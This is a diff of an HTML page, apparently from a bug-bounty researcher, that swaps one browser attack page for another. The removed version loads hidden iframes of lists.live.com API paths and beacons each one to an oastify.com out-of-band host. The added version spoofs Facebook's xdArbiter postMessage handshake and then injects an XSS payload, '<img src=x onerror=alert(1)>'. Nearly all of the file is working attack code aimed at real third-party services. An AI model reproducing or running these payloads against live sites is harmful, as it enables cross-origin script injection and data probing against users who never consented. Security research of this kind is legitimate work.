@@ -1,48 +1,27 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>RFI-like via iframe</title>
-  <style>
-    body {
-      background: black;
-      color: #0f0;
-      font-family: monospace;
-      padding: 1rem;
-    }
-  </style>
-</head>
-<body>
-  <h2>🔥 postMessage + RFI-like Fuzzer</h2>
-  <pre id="log"></pre>
+  <body>
+    <script>
+      const TARGET = "https://code-dev.fb.com"; // ou outro onde o SDK esteja ativo
+      const ORIGIN = "https://pedrojuniorrd.github.io";
 
-  <script>
-    const paths = [
-      "/_vti_bin/portalapi.aspx?cmd=GetListData",
-      "/_layouts/15/viewlsts.aspx",
-      "/personal/me/_layouts/15/settings.aspx",
-      "/sites/root/_api/web/lists",
-      "/_api/contextinfo",
-      "/_api/site/rootweb"
-    ];
+      // 1. Envia um "register ack" para tentar ser aceito como origem
+      window.parent.postMessage({
+        xdArbiterRegisterAck: ORIGIN
+      }, "*");
 
-    const log = (msg) => {
-      document.getElementById("log").textContent += msg + "\n";
-      console.log(msg);
-    };
-
-    window.addEventListener("DOMContentLoaded", () => {
-      log("📤 Disparando payloads iframe RFI-like...");
-
-      paths.forEach((path, i) => {
-        const iframe = document.createElement("iframe");
-        iframe.src = "https://lists.live.com" + path;
-        iframe.style.display = "none";
-        document.body.appendChild(iframe);
-
-        const img = new Image();
-        img.src = `https://k2nxq1ustsd6o6gb79wwabzjcai16rug.oastify.com/rfi-${i}?target=${encodeURIComponent(path)}`;
-      });
-    });
-  </script>
-</body>
+      // 2. Aguarda 1 segundo e envia payload real
+      setTimeout(() => {
+        window.parent.postMessage({
+          xdArbiterHandleMessage: true,
+          message: {
+            method: "Alert", // Fuzz aqui
+            params: JSON.stringify({
+              text: "<img src=x onerror=alert(1)>"
+            })
+          }
+        }, "*");
+      }, 1000);
+    </script>
+  </body>
 </html>
